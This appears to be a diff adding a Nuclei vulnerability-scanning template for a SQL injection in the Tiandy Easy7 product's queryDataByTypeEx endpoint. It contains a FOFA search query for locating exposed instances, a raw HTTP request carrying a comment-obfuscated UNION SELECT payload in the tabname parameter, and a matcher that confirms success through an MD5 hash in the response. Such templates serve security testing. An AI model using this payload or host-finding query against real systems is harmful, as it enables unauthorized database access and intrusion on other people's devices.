@@ -1,0 +1,31 @@
+id: tiandy-easy7-queryDataByTypeEx-sqli
+info:
+  name: 天地伟业Easy7 queryDataByTypeEx SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59535/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: body="./images/ico/Easy7_logo_transparent.png"|| body="/Easy7/index.html"
+    tips:
+    repair:
+    version:
+  tags: tiandy,sqli,easy7
+
+http:
+  - raw:
+      - |
+        GET /Easy7/rest/workbook/queryDataByTypeEx?tabname=/*!TAB_WORKBOOK_TYPE*/where/**/1=1/**/union/**/select/**/md5(1),1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.2609.50 Safari/537.36
+        Connection: close
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,'c4ca4238a0b923820dcc509')
+        condition: and
